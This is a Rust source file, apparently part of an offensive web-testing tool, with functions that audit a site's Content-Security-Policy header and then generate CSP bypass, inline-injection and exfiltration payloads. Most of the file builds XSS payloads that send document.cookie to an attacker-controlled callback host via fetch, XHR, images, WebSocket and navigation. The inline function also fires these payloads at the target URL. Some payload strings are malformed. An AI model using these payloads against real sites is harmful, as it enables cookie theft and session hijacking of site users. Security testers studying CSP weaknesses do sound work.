use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn analyze(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} CSP Policy Analysis", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let csp = resp.headers().get("content-security-policy").and_then(|v| v.to_str().ok()).unwrap_or("");

    if csp.is_empty() {
        println!("{} No Content-Security-Policy header found!", "[!]".red().bold());
        println!("{} The target is vulnerable to XSS and injection attacks.", "[*]".cyan().bold());
        return Ok(());
    }

    println!("{} Raw CSP:\n  {}", "[*]".cyan().bold(), csp);
    println!("\n{} Analysis:", "[*]".cyan().bold());

    let directives: Vec<&str> = csp.split(';').map(|s| s.trim()).collect();
    let mut issues = Vec::new();

    for d in &directives {
        if d.starts_with("default-src") {
            if d.contains("*") { issues.push("default-src contains wildcard *".to_string()); }
            if d.contains("unsafe-inline") { issues.push("default-src allows unsafe-inline".to_string()); }
            if d.contains("unsafe-eval") { issues.push("default-src allows unsafe-eval".to_string()); }
        }
        if d.starts_with("script-src") {
            if d.contains("*") { issues.push("script-src contains wildcard *".to_string()); }
            if d.contains("unsafe-inline") { issues.push("script-src allows unsafe-inline — XSS possible".to_string()); }
            if d.contains("unsafe-eval") { issues.push("script-src allows unsafe-eval — eval() allowed".to_string()); }
            if d.contains("data:") { issues.push("script-src allows data: URIs".to_string()); }
            if d.contains("http:") || d.contains("http://") { issues.push("script-src allows non-HTTPS sources".to_string()); }
        }
        if d.starts_with("style-src") && d.contains("unsafe-inline") { issues.push("style-src allows unsafe-inline".to_string()); }
        if d.starts_with("img-src") && d.contains("*") { issues.push("img-src contains wildcard *".to_string()); }
        if d.starts_with("connect-src") {
            if d.contains("*") { issues.push("connect-src contains wildcard * — exfiltration possible".to_string()); }
            if d.contains("http:") { issues.push("connect-src allows non-HTTPS".to_string()); }
        }
        if d.starts_with("object-src") {
            if d.contains("*") || d.contains("data:") { issues.push("object-src allows plugins/flash".to_string()); }
        }
    }

    let has_default = directives.iter().any(|d| d.starts_with("default-src"));
    if !has_default { issues.push("No default-src directive — missing fallback".to_string()); }
    let has_script = directives.iter().any(|d| d.starts_with("script-src"));
    if !has_script { issues.push("No script-src directive — relies on default-src".to_string()); }
    if !csp.contains("report-uri") && !csp.contains("report-to") { issues.push("No report-uri/report-to — no violation reporting".to_string()); }
    if csp.contains("nonce-") { println!("  {} Uses nonces (good)", "*".green()); }
    if csp.contains("'strict-dynamic'") { println!("  {} Uses strict-dynamic (good)", "*".green()); }

    if issues.is_empty() {
        println!("  {} No issues found — CSP looks solid.", "*".green().bold());
    } else {
        println!("  {} {} potential issue(s):", "*".red().bold(), issues.len());
        for issue in &issues { println!("    {} {}", ">".red(), issue); }
    }
    Ok(())
}

pub async fn bypass(url: &str, timeout: u64, callback: &str) -> anyhow::Result<()> {
    println!("{} CSP Bypass Testing", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:      {}", "[*]".cyan().bold(), url);
    println!("{} Callback: {}", "[*]".cyan().bold(), callback);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let csp = resp.headers().get("content-security-policy").and_then(|v| v.to_str().ok()).unwrap_or("").to_lowercase();

    let mut bypasses = Vec::new();

    if csp.contains("unsafe-inline") {
        bypasses.push(("Inline script", format!("<script>fetch('{}?leak='+document.cookie)</script>", callback)));
    }
    if csp.contains("unsafe-eval") {
        bypasses.push(("eval()", format!("eval(\"fetch('{}?leak='+document.cookie)\")", callback)));
    }
    if csp.contains("script-src") && csp.contains("*") {
        bypasses.push(("Wildcard script-src", format!("<script src=\"{}?leak=\"+document.cookie></script>", callback)));
    }
    let jsonp_endpoints = ["ajax.googleapis.com", "api.jquery.com", "cdn.jsdelivr.net", "unpkg.com", "jsonip.com"];
    for ep in &jsonp_endpoints {
        if csp.contains(ep) {
            bypasses.push(("JSONP endpoint", format!("<script src=\"https://{}/callback=fetch('{}?leak='+document.cookie)\"></script>", ep, callback)));
        }
    }
    if csp.contains("data:") && csp.contains("script-src") {
        bypasses.push(("data: URI", format!("<script src=\"data:text/javascript,fetch('{}?leak='+document.cookie)\"></script>", callback)));
    }
    if csp.contains("object-src") && (csp.contains("*") || csp.contains("data:")) {
        bypasses.push(("Flash/object", format!("<object data=\"data:application/x-shockwave-flash,fetch('{}?leak='+document.cookie)\"></object>", callback)));
    }
    if !csp.contains("connect-src") && !csp.contains("default-src") {
        bypasses.push(("Missing connect-src", format!("fetch('{}?leak='+document.cookie)", callback)));
    }
    if csp.contains("base-uri") == false {
        bypasses.push(("Base tag hijack", format!("<base href=\"{}\">", callback)));
    }

    if bypasses.is_empty() {
        println!("{} No CSP bypasses found — policy is strict.", "[-]".green().bold());
    } else {
        println!("{} {} potential bypass(es):", "[!]".red().bold(), bypasses.len());
        for (name, payload) in &bypasses {
            println!("  {} {:20} {}", "*".cyan(), name, payload);
        }
    }
    Ok(())
}

pub async fn inline(url: &str, timeout: u64, callback: &str) -> anyhow::Result<()> {
    println!("{} CSP Inline Script Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        format!("<script>fetch('{}?inline=1&cookie='+document.cookie)</script>", callback),
        format!("<img src=x onerror=\"fetch('{}?onerror='+document.cookie)\">", callback),
        format!("<svg onload=\"fetch('{}?svg='+document.cookie)\">", callback),
        format!("<body onload=\"fetch('{}?body='+document.cookie)\">", callback),
        format!("<style>@import url('{}?style=1');</style>", callback),
        format!("<link rel=stylesheet href=\"{}?link=1\">", callback),
    ];

    for (i, p) in payloads.iter().enumerate() {
        let test_url = if url.contains('?') { format!("{}&xss={}", url, url_encode(p)) } else { format!("{}?xss={}", url, url_encode(p)) };
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let reflected = body.contains(p) || body.contains("onerror") || body.contains("onload");
                let tag = if reflected { "REFLECTED".yellow().to_string() } else { "not reflected".to_string() };
                println!("  {} [{:02}] status={} {}", "*".cyan(), i + 1, status, tag);
            }
            Err(_) => { println!("  {} [{:02}] error", "*".red(), i + 1); }
        }
    }

    println!("\n{} Check callback URL for incoming requests.", "[*]".cyan().bold());
    Ok(())
}

pub async fn exfil(url: &str, timeout: u64, callback: &str) -> anyhow::Result<()> {
    println!("{} CSP Exfiltration Channel Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:      {}", "[*]".cyan().bold(), url);
    println!("{} Callback: {}", "[*]".cyan().bold(), callback);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let csp = resp.headers().get("content-security-policy").and_then(|v| v.to_str().ok()).unwrap_or("").to_lowercase();

    let channels = [
        ("img-src", "document.cookie", format!("<img src=\"{}?c=\"+document.cookie>", callback)),
        ("link/style", "CSS exfil", format!("<link rel=stylesheet href=\"{}?css=\"+document.cookie>", callback)),
        ("connect-src (fetch)", "fetch API", format!("fetch('{}?f='+document.cookie)", callback)),
        ("connect-src (XHR)", "XMLHttpRequest", format!("var x=new XMLHttpRequest();x.open('GET','{}?x='+document.cookie);x.send()", callback)),
        ("img-src (Image obj)", "Image object", format!("new Image().src='{}?i='+document.cookie", callback)),
        ("navigate", "window.location", format!("window.location='{}?n='+document.cookie", callback)),
        ("WebSocket", "WS exfil", format!("new WebSocket('ws{}?w='+document.cookie)", callback.replace("http", "").replace("https", ""))),
        ("DNS prefetch", "DNS exfil", format!("<link rel=dns-prefref href=\"//\"+document.cookie+\".{}\">", callback.replace("https://","").replace("http://",""))),
    ];

    let mut viable = Vec::new();
    for (name, technique, payload) in &channels {
        let blocked = csp.contains("connect-src") && !csp.contains("*") && name.contains("connect")
            || csp.contains("img-src") && !csp.contains("*") && !csp.contains("data:") && name.contains("img");
        let tag = if blocked { "BLOCKED".green().to_string() } else { "VIABLE".red().bold().to_string() };
        println!("  {} {:25} {} — {}", "*".cyan(), name, tag, technique);
        if !blocked { viable.push((name.to_string(), payload.to_string())); }
    }

    if viable.is_empty() {
        println!("\n{} No exfiltration channels found — CSP blocks all.", "[-]".green().bold());
    } else {
        println!("\n{} {} viable exfiltration channel(s):", "[!]".red().bold(), viable.len());
        for (name, payload) in &viable { println!("  {} {} → {}", "*".cyan(), name, payload); }
    }
    Ok(())
}

fn url_encode(s: &str) -> String {
    let mut result = String::new();
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '~' { result.push(c); }
        else { for b in c.to_string().bytes() { result.push_str(&format!("%{:02X}", b)); } }
    }
    result
}
